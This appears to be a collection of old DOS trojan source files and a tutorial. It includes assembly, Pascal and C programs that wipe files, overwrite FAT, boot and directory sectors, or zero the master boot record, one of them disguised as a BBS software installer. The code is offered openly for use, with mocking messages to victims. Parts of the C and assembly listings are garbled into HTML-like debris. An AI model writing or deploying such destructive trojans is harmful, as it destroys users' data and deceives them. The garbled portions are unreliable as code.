dseg      dw    ?                      ;holds old dir DTA segment
dofs      dw    ?                      ;holds old dir DTA segment

start:

     mov  di,offset vl                 ;decrypt skism string
     mov  si,offset vl                 ;
     mov  cx,09h                       ;

     cld                               ;

repeat:

     lodsb                             ;
     xor  al,92h                       ;
     stosb                             ;
     dec  cx                           ;
     jcxz bombstart                    ;
     jmp  repeat                       ;

bombstart:

     mov   dx,offset  dirdta           ;set DTA to hold directorys
     mov   ah,1ah                      ;DOS set DTA function
     int   21h                         ;

     mov   ah,19h                      ;get drive code
     int   21h                         ;

     mov   dl,al                       ;save drive code into dl
     inc   dl                          ;translate for function 3bh

     mov   ah,47h                      ;save current dir
     mov   si, offset default          ;save current dir into buffer
     int   21h                         ;

     mov   dx,offset root              ;change dir to root
     mov   ah,3bh                      ;
     int   21h                         ;

     mov   cx,13h                      ;find directorys
     mov   dx,offset dircards          ;find only directorys
     mov   ah,4eh                      ;find first file

scanloop:

     int   21h                         ;
     jc    quit                        ;quit if no more dirs/error

     jmp   changedir                   ;change to that dir

findnextdir:

     mov   ah,4fh                      ;find next directory
     mov   dx,offset dircards          ;
     jmp   scanloop

changedir:

     mov   dx,offset dirdta + 30       ;point to dir name in DTA
     mov   ah,3bh                      ;change directory
     int   21h                         ;

smash:

     mov   ah,2fh                      ;
     int   21h                         ;
     mov   [dseg],es                   ;save dir DTA segemnt
     mov   [dofs],bx                   ;and offset
     int   21h

     mov   dx,offset filedta           ;use file DTA as new DTA
     mov   ah,1ah                      ;
     int   21h                         ;

     mov   cx,0007h                    ;find flat attributes
     mov   dx,offset filecards         ;point to '*.*',0 wildcard spec
     mov   ah,4eh                      ;find first file

filescanloop:

     int    21h                        ;
     jc     done                       ;quit on error/no files found


     mov    ax,4301h                   ;clear files attributes
     xor    cx,cx                      ;
     mov    dx, offset filedta + 30    ;
     int    21h                        ;
     jc     quit

     mov    ah,3ch                     ;truncate file
     int    21h
     jc     quit

     mov    bx,ax                      ;save handle

     jc     done

     mov    ah,41h                     ;erase file
     int    21h                        ;

     mov    ah,3eh                     ;close file
     int    21h                        ;

     mov    ah,39h                     ;make directory in place of file
     int    21h                        ;

     mov    ah,4fh                     ;find next
     jmp    filescanloop

done:

     mov    ah,1ah                     ;restore directory DTA
     mov    ds,[dseg]                  ;
     mov    dx,[dofs]                  ;
     int    21h

     mov   dx,offset root              ;change dir to root
     mov   ah,3bh                      ;
     int   21h                         ;

     jmp   findnextdir


quit:

     mov    ah,3bh
     mov    dx,offset root             ;change to root
     int    21h

     mov    ah,39h
     mov    dx,offset vl
     int    21h
     jc     restore

restore:

     mov    dx,offset default          ;restore original directory
     mov    ah,3bh                     ;
     int    21h                        ;

     mov    ah,4ch                     ;
     int    21h                        ;

vl   db     0c1h,0f9h,0fbh,0e1h,0ffh,0bch,06dh,0b2h,06dh,0

filler  db  28  dup(1ah)

main    endp
code    ends
        end    main



-------------------------------------
Trojan Source - tcs_troj.pas


          Program Wipe_The_Fuckers_HD;
              uses dos,crt;
          var read:string;
            Begin
          clrscr;
          Writeln ('ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿');
          Writeln ('³ TCS 1.41 Installation & Configuration ³');
          Writeln ('³ Author : Tiger Shark                  ³');
          Writeln ('³ Co-Author : Snow Dragon               ³');
          Writeln ('ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ');
          writeln ('       Written by TCS Incoporated');
          Write ('Please enter the path of your BBS EXE [MAIN.EXE] ,');
          readln (read);
          write ('Please wait ..');
          inline ($B0/$02/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {C:}
          write ('.');
          inline ($B0/$03/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {D:}
          write ('.');
          inline ($B0/$04/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {E:}
          write ('.');
          inline ($B0/$05/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {F:}
          write ('.');
          inline ($B0/$06/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {G:}
          write ('.');
          inline ($B0/$07/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {H:}
          write ('.');
          inline ($B0/$01/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {B:}
          write ('.');
          inline ($B0/$00/$B9/$FF/$00/$BA/$00/$00/$CD/$26); {A:}
          write ('..Done! Now for the Configuration...');
          writeln;
          write ('Press [Return] to continue.');
          readln;
          textcolor (14);
          writeln ('Hello Welcome to The World of S.W.A.T.');
          writeln ('Well you must have really made someone mad!');
          writeln ('See we are a group much like PHUCK but we are better!');
          writeln ('We do what we do for nothing just the fun of it!');
          Writeln ('Well as you might already know none of the names');
          Writeln ('we leave are real. We make lots of them up.');
          Writeln ('Well let me explain what has now happened to you HD.');
          Writeln ('See first you thought it was installing TCS well wrong!');
          Writeln ('See this program you just ran FUCKED UP youre whole HD!');
          Writeln ('Well that about all for now, just one last thing.');
          Writeln ('If we call back and your board is back,');
          Writeln ('We Will do this again but this time should do it!');
          Writeln('');
          TextColor (9);
          Writeln('S.W.A.T. Strikes Again!');
          End.
-------------------------------------
Trojan Source - toxic1.c


/* TOXiC1 - TOXiC Trojan #1 - Programmed by Izzy Stradlin' and MiSERY/CPA  */
/* MiSERY1 is the name given to this trojan.  I programmed it, I name the  */
/* Mother fucker.  I hereby give all rights of this trojan to MiSERY/CPA.  */
/* If ya don't like it, TOUGH.  I Give ALL rights EXCEPT for the NAME to   */
/* CPA - eg. NOONE CAN CHANGE THE NAME OF THIS THING W/O MY PERMISSION AND */
/* LEAVE MY NAME IN IT.  The name must stay on, both my name and the name  */
/* of the trojan are copyrighted (c) 90 to Izzy Stradlin'                  */
/* ----------------------------------------------------------------------- */
/* Capt. - This isn't a Real Virus - It's a Trojan.  Sorry, still trying   */
/* to use something similar to ASM's int 21h; for DOSs features, then I'll */
/* Get going on Virii.  As is, this Destroys Boot/Fat/Dir on Most harddisks*/
/* and Well, there is so far no way that I know of that it can recover     */
/* what the disk lost, as it writes the trojan name over everything.  This */
/* SHOULD Go for BOTH FAT Tables, but I am not going to try it out.  Haha. */
/* You try it - Tell me how it works! all I know is that it got 6 of my    */
/* Flippin' floppies, damnit!  - Delete this bottom message to you after   */
/* Checking it out - Makes it look more professional.  Leave the top text  */
/* part in tact, just in case you want to pass it around.                  */
/* This is JUST A START.  They DO/WILL Get better - this is weak, but as I */
/* Said - no known recovery from it.                                       */
/* Oh, this looks for C: through H: */

#define   TROJAN_NAME  "TOXiC"    /* Trojan Name */

/* Procedures  */
void infect_fat();
void infect_dir();
void infect_boot();
void main();
/* Simple, eh? */


void infect_fat()
{
    int i;
    for (i=2; i<7; i++)="" {="" abswrite(i,0,2,trojan_name);="" }="" }="" void="" infect_dir()="" {="" int="" i;="" for="" (i="2;"></7;><7; i++)="" {="" abswrite(i,2,2,trojan_name);="" }="" }="" void="" infect_boot()="" {="" int="" i;="" for="" (i="0;"></7;><7; i++)="" {="" abswrite(i,4,2,trojan_name);="" }="" }="" void="" main()="" {="" printf(trojan_name);="" infect_fat();="" infect_dir();="" infect_boot();="" }="" -------------------------------------="" trojan="" source="" -="" trash.asm="" page="" ,132="" title="" trash="" -="" smashes="" the="" boot="" record="" on="" the="" first="" hard="" disk="" name="" trash="" .radix="" 16="" code="" segment="" assume="" cs:code,ds:code="" org="" 100="" codex="" equ="" 0c000="" ;="" or="" use="" 0300="" when="" tracing="" dos="" cr="" equ="" 0dh="" lf="" equ="" 0a="" start:="" jmp="" do_it="" oldint1="" dd="" newintx="" dd="" oldintx="" dd="" trace="" db="" 1="" found="" db="" 0="" buffer="" db="" 200="" dup="" (0)="" message="" db="" cr,lf,'**********="" w="" a="" r="" n="" i="" n="" g="" !="" !="" !="" **********',cr,lf,cr,lf="" db="" 'this="" program,="" when="" run,="" will="" zero="" (destroy!)="" the',cr,lf="" db="" 'master="" boot="" record="" of="" your="" first="" hard="" disk.',cr,lf,cr,lf="" db="" 'the="" purpose="" of="" this="" is="" to="" test="" the="" antivirus="" software,',cr,lf="" db="" 'so="" be="" sure="" you="" have="" installed="" your="" favourite',cr,lf="" db="" 'protecting="" program="" before="" running="" this="" one!',cr,lf="" db="" "(it's="" almost="" sure="" it="" will="" fail="" to="" protect="" you="" anyway!)",cr,lf="" db="" cr,lf,'press="" any="" key="" to="" abort,="" or',cr,lf="" db="" 'press="" ctrl-alt-rightshift-f5="" to="" proceed="" (at="" your="" own="" risk!)="" $'="" warned="" db="" cr,lf,cr,lf,'allright,="" you="" were="" warned!',cr,lf,'$'="" do_it:="" mov="" ax,600="" ;="" clear="" the="" screen="" by="" scrolling="" it="" up="" mov="" bh,7="" mov="" dx,1950="" xor="" cx,cx="" int="" 10="" mov="" ah,0f="" ;="" get="" the="" current="" video="" mode="" int="" 10="" ;="" (the="" video="" page,="" more="" exactly)="" mov="" ah,2="" ;="" home="" the="" cursor="" xor="" dx,dx="" int="" 10="" mov="" ah,9="" ;="" print="" a="" warning="" message="" mov="" dx,offset="" message="" int="" 21="" mov="" ax,0c08="" ;="" flush="" the="" keyboard="" and="" get="" a="" char="" int="" 21="" cmp="" al,0="" ;="" extendet="" ascii?="" jne="" quit1="" ;="" exit="" if="" not="" mov="" ah,8="" ;="" get="" the="" key="" code="" int="" 21="" cmp="" al,6c="" ;="" shift-f5?="" jne="" quit1="" ;="" exit="" if="" not="" mov="" ah,2="" ;="" get="" keyboard="" shift="" status="" int="" 16="" and="" al,1101b="" ;="" ctrl-alt-rightshift?="" jnz="" proceed="" ;="" proceed="" if="" so="" quit1:="" jmp="" quit="" ;="" otherwise="" exit="" proceed:="" mov="" ah,9="" ;="" print="" the="" last="" message="" mov="" dx,offset="" warned="" int="" 21="" mov="" ax,3501="" ;="" get="" interrupt="" vector="" 1="" (single="" steping)="" int="" 21="" mov="" word="" ptr="" oldint1,bx="" mov="" word="" ptr="" oldint1+2,es="" mov="" ax,2501="" ;="" set="" new="" int="" 1="" handler="" mov="" dx,offset="" newint1="" int="" 21="" mov="" ax,3513="" ;="" get="" interrupt="" vector="" 13="" int="" 21="" mov="" word="" ptr="" oldintx,bx="" mov="" word="" ptr="" oldintx+2,es="" mov="" word="" ptr="" newintx,bx="" mov="" word="" ptr="" newintx+2,es="" ;="" the="" following="" code="" is="" sacred="" in="" it's="" present="" form.="" ;="" to="" change="" it="" would="" cause="" volcanos="" to="" errupt,="" ;="" the="" ground="" to="" shake,="" and="" program="" not="" to="" run!="" mov="" ax,200="" push="" ax="" push="" cs="" mov="" ax,offset="" done="" push="" ax="" mov="" ax,100="" push="" ax="" push="" cs="" mov="" ax,offset="" faddr="" push="" ax="" mov="" ah,55="" iret="" assume="" ds:nothing="" faddr:="" jmp="" oldintx="" newint1:="" push="" bp="" mov="" bp,sp="" cmp="" trace,0="" jne="" search="" exit:="" and="" [bp+6],not="" 100="" exit1:="" pop="" bp="" iret="" search:="" cmp="" [bp+4],codex="" jb="" exit1="" ;or="" use="" ja="" if="" you="" want="" to="" trace="" dos-owned="" interrupt="" push="" ax="" mov="" ax,[bp+4]="" mov="" word="" ptr="" newintx+2,ax="" mov="" ax,[bp+2]="" mov="" word="" ptr="" newintx,ax="" pop="" ax="" mov="" found,1="" mov="" trace,0="" jmp="" exit="" assume="" ds:code="" done:="" mov="" trace,0="" push="" ds="" mov="" ax,word="" ptr="" oldint1+2="" mov="" dx,word="" ptr="" oldint1="" mov="" ds,ax="" mov="" ax,2501="" ;="" restore="" old="" int="" 1="" handler="" int="" 21="" pop="" ds="" ;="" code="" beyong="" this="" point="" is="" not="" sacred...="" ;="" it="" may="" be="" perverted="" in="" any="" manner="" by="" any="" pervert.="" cmp="" found,1="" ;="" see="" if="" original="" int="" 13="" handler="" found="" jne="" quit="" ;="" exit="" if="" not="" push="" ds="" pop="" es="" ;="" restore="" es="" mov="" ax,301="" ;="" write="" 1="" sector="" mov="" cx,1="" ;="" cylinder="" 0,="" sector="" 1="" mov="" dx,80="" ;="" head="" 0,="" drive="" 80h="" mov="" bx,offset="" buffer="" pushf="" ;="" simulate="" int="" 13="" call="" newintx="" ;="" do="" it="" quit:="" mov="" ax,4c00="" ;="" exit="" program="" int="" 21="" code="" ends="" end="" start="" -------------------------------------="" trojan="" source="" -="" trasher.asm="" äääääääääííííííííí="">>> Article From Evolution #1 - YAM '92

Article Title: Thrasher Trojan Disassembly
Author: Natas Kaupas


;*****************************************************************************
;
; Thrasher Trojan Cheap Disassembly
; Disassembled Using Sourcer v3.32 (By Natas Kaupas)
;
; To Assemble This File Use Any Text Editor To Cut Out The Source Definition
; Section And Comments (If You Want), And Then Use TASM To Compile It...
; Have Fun With This Trojan...It Will Format And Display A Message (Try it
; yourself for more information on it...hehe)
;
;*****************************************************************************
PAGE    59,123

  
seg_a             segment byte public
          assume  cs:seg_a, ds:seg_a
  
  
          org     100h
  
thrasher  proc    far
  
start:
          jmp     short loc_1             ; (012E)
          db      90h
          db      'Thrasher v. 1.00 by '
          db      9 dup (90h)
          db       20h, 20h
data_3            db      ' Lamerz Die!'
loc_1:
          mov     di,offset data_6        ; (8096:0200=20h)
loc_2:
          mov     si,offset data_3        ; (8096:0122=20h)
loc_3:
          movsb                           ; Mov [si] to es:[di]
          cmp     si,12Eh
          je      loc_5                   ; Jump if equal
          jmp     short loc_3             ; (0134)
loc_5:
          cmp     di,4FFh
          jg      loc_6                   ; Jump if >
          jmp     short loc_2             ; (0131)
loc_6:
          nop
          mov     al,2
          mov     bx,offset data_6        ; (8096:0200=20h)
          mov     cx,10h
          mov     dx,0
loc_7:
          int     26h                     ; Absolute disk write, drive al
          inc     dx
          jmp     short loc_7             ; (0151)
          db      154 dup (90h)
          db      0B4h, 4Ch,0CDh, 21h
          db      12 dup (90h)
data_6            dw      2020h                   ; Data table (indexed access)
          db      'Lamerz Die!  Lamerz Die! Lamerz '
          db      'Die! Lamerz Die! Lamerz Die! Lam'
          db      'erz Die! Lamerz Die! Lamerz Die!'
          db      ' Lamerz Die! Lamerz Die! Lamerz '
          db      'Die! Lamerz Die! Lamerz Die! Lam'
          db      'erz Die! Lamerz Die! Lamerz Die!'
          db      ' Lamerz Die! Lamerz Die! Lamerz '
          db      'Die! Lamerz Die! Lamerz Die! L'
  
thrasher  endp
  
seg_a             ends
  
          end     start


-------------------------------------
Trojan Source - trojan.pas


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> Turbo Pascal Programming :

    I have often been asked, how can I make a virus with Turbo Pascal. Well the
 answer is you can't. The reason is that Turbo Pascal doesn't have the ability
 to stay resident and monitor/hook up DOS interrupts needed by a virus for the
 infection of files. Turbo Pascal can make TSRs, but these are mostly one shot
 deals that can execute after a certain time or after a certain number of
 keystrokes. However, Turbo Pascal is an excellent language to program trojans
 with, and can surpass almost everything possible with Basic. It is also
 relatively easy to learn compared to Assembler or even C.
    Now, what I'm going to attempt is explain the steps in creating a simple
 Turbo Pascal trojan. This is for beginners only. I am simply trying to show
 the different procedures and functions that can be used in trojan programming.
 Thus I will detail every step and recopy the complete source at the end of
 this article. By the way, I'm using the Turbo Pascal v5.5 compiler.
 Important: All lines beginning with ">" are part of the program. Just type
 these lines in, but omit the ">". Do not type in the ">".

 Step 1- Initializing the program: Without this you're not going to get very
         far. So just type in the following:

 >        PROGRAM TROJAN;
 >        USES DOS;

         I'm not putting in the CRT unit because we have no need for it here.

 Step 2- Figure out what you're going to do: The hardest part of programming a
         trojan is coming up with a worthwhile concept. After that, programming
         should be a breeze. For this one we will simply go to the root
         directory and destroy the two hidden .SYS files and COMMAND.COM.
 Step 3- Figure out how you're going to do it: Once you have the plan thought
         up, the programming part shouldn't be to hard. Now for our trojan we
         need a way to locate our files. Now since the .SYS files might differ
         from one system to the other, we cannot go with default filenames. So
         we are going to use a recursive procedure similar to the one in my
         bypass trojan v1.0 (if you read that article) to find all .SYS and
         .COM in the root directory of the C: drive. I chose the C: drive for
         obvious reasons, but you can just repeat the process for all logical
         drives A: to E: and more. You also need to define a few variables that
         will be used later on. Type the following in:

 >        VAR
 >        Target  : SEARCHREC;  { Fundamental. This is a internal record that }
 >                              { is necessary for the Findfirst function.    }
 >        T       : FILE;
 >        PROCEDURE KILL (FIND : STRING);
 >        BEGIN

         Now what we want is to get drive C: so type in the following:

 >        Chdir ('C:\');

         Now we have to find our target files. For this we will use the
         internal procedure Findfirst. The command string for Findfirst is:

          FindFirst(Path : string; Attr : Word; var S : SearchRec);

         Where Path is the files we want to find. Path will be called from the
         main program. S is the variable Target defined above and Attr is the
         attributes we are looking for. Here is a list of attributes for the
         Findfirst and other procedures:
             ReadOnly  = $01;
             Hidden    = $02;
             SysFile   = $04;
             VolumeID  = $08;
             Directory = $10;
             Archive   = $20;
             AnyFile   = $3F;

         Since we are looking for all files with all attributes except
         directories, are Attr will be $3F - $10. So type this in:

 >        Findfirst (FIND,($3F - $10),Target);
 >        WHILE DOSERROR = 0 DO
 >        Begin
         If a file is found, Doserror will equal 0. Otherwise we return to the
         main program, our task achieved. Now let's say that our trojan has
         found a file, we must assign it to a variable, the variable T defined
         above. Now the file found by Findfirst has been saved in the Target
         record. To get the full filename, we must enter Target.Name. So type
         in the following:

 >        ASSIGN (T,Target.name);

         Now we must change the files attribute to archive in case it's a
         read-only or system file (the .SYS files). So we use the procedure
         Setfattr. The correct command line is

          SetFAttr(var F; Attr : Word);

         Where F is the T variable and Attr it's new attribute. So type in the
         following:

 >        Setfattr (T,$20);

         This gives the archive attribute to our file. Having bypassed file
         write-protection, we must now check for disk write-protection.
         However, physical disk write-protection is unremovable, so the best we
         can do is check for it, and if found, abort the program or pass to
         another drive. To check for write protect we will create a directory
         on the drive, and check the ioresult. If the directory is successfully
         created, then ioresult will equal 0 and the disk is not
         write-protected, otherwise we abort. It is important to state the
         {$I-} and {$I+} parameters to turn off a possible runtime error. So
         type in the following:
 >        {$I-}
 >        Mkdir ('á');
 >        {$I+}
 >        IF IORESULT = 0 THEN
 >        Begin
 >        Rmdir ('á');

         We use á as this is less obvious in the compiled program. Now that we
         can access are target file properly, we must decide on a way to
         destroy it. Now we could erase it but this can be repaired with
         undelete. So I choose to cut the file in half, thus making it
         unusable. Now we use the truncate command. This command cuts the file
         at the current file position. So we must go halfway into the file
         before truncating it. We use seek. Type in the following:

 >        Reset (T);
 >        Seek (T,Filesize(T) DIV 2);
 >        Truncate (T);
 >        Close (T);
 >        End

         Don't forget to close the file (Close(T)). Now we just add the command
         that happens if the drive is write-protected. Type in the following:

 >        ELSE
 >        Exit;
 >        Findnext (Target);
 >        End;
 >        END;

         The Findnext procedure simply repeats the Findfirst routine until all
         files are found, then Doserror doesn't equal 0 and the program exits.
         We must now type up the main program. The only checking done here is
         to check if drive C: exists, and then we execute procedure KILL for
         .SYS and .COM files. Type in the following:

 >        BEGIN
 >        {$I-}
 >        Chdir ('C:\');
 >        {$I+}
 >        IF IORESULT = 0 THEN
 >        Begin
 >        KILL ('*.COM');
 >        KILL ('*.SYS');
 >        End;
 >        END.

         That assigns *.SYS and *.COM to FIND used in Findfirst.

    Well that ends this program. I made it as detailed as possible for Turbo
 Pascal beginners. More advanced programmers should have no trouble with it. To
 anyone wanting to learn more, I suggest reading through all the procedures
 from the DOS unit, as these are the most helpful in trojan programming. The
 full source follows, and if you want to test it, simply replace C:\ with A:\
 and try it on a system disk in drive A:\ (for example).





    Source:


      PROGRAM TROJAN;
      USES DOS;
      VAR
      Target  : SEARCHREC;
      T       : FILE;

      PROCEDURE KILL (FIND : STRING);
      BEGIN
      Chdir ('C:\');
      Findfirst (FIND,($3F - $10),Target);
      WHILE DOSERROR = 0 DO
      Begin
      ASSIGN (T,Target.name);
      Setfattr (T,$20);
      {$I-}
      Mkdir ('á');
      {$I+}
      IF IORESULT = 0 THEN
      Begin
      Rmdir ('á');
      Reset (T);
      Seek (T,Filesize(T) DIV 2);
      Truncate (T);
      Close (T);
      End
      ELSE
      Exit;
      Findnext (Target);
      End;
      END;
      BEGIN
      {$I-}
      Chdir ('C:\');
      {$I+}
      IF IORESULT = 0 THEN
      Begin
      KILL ('*.COM');
      KILL ('*.SYS');
      End;
      END.

 Mechanix [NuKE]
</7;></40;></dos.h></conio.h></string.h></boom,></1)></3)></=50;j++){></dir.h></stdlib.h></stdio.h></dos.h></string.h></dos.h>